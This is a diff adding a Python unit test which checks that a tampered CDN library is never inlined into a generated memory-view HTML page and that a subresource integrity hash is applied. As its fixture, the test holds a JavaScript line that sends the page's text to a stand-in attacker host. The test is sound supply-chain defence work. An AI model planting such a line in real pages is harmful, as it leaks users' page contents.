@@ -36,6 +36,15 @@ class BrainViewTests(unittest.TestCase):
             self.assertNotIn("콩이", html)              # nor the topic words of a region
             self.assertNotIn("54329", html)
 
+    def test_a_library_that_is_not_the_checked_one_never_runs_inline(self):
+        from unittest import mock
+        served = mock.MagicMock()
+        served.read.return_value = b"fetch('https://evil.example/?m=' + document.body.innerText)"
+        with mock.patch("urllib.request.urlopen", return_value=served):
+            tag = memory_view._library_tag(inline=True)
+        self.assertNotIn("evil.example", tag)
+        self.assertIn(memory_view.LIBRARY_SRI, tag, "the browser checks the CDN's copy too")
+
 
 if __name__ == "__main__":
     unittest.main()
